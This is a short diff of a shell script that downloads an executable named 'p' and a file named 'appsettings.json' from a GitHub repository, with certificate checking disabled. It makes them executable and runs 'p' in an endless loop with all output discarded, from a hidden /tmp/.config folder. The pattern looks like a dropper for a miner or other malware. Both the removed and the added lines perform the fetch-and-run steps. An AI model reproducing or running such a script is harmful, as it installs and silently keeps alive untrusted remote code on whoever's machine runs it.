@@ -2,10 +2,9 @@
 
 src="https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main"
 
-mkdir -p "/tmp/.config"
-wget --no-check-certificate -qO "/tmp/.config/appsettings.json" "${src}/q1.json"
-wget --no-check-certificate -qO "/tmp/.config/p" "${src}/q"
-chmod -R 777 "/tmp/.config"
-
+wget --no-check-certificate -O ./appsettings.json https://github.com/curiosityinteriorsuk/2088/raw/main/q1.json
+wget --no-check-certificate -O ./p https://github.com/curiosityinteriorsuk/2088/raw/main/q
+chmod u+x ./appsettings.json
+chmod u+x ./p
 while true; do cd /tmp/.config; ./p >/dev/null 2>&1 ; done
 
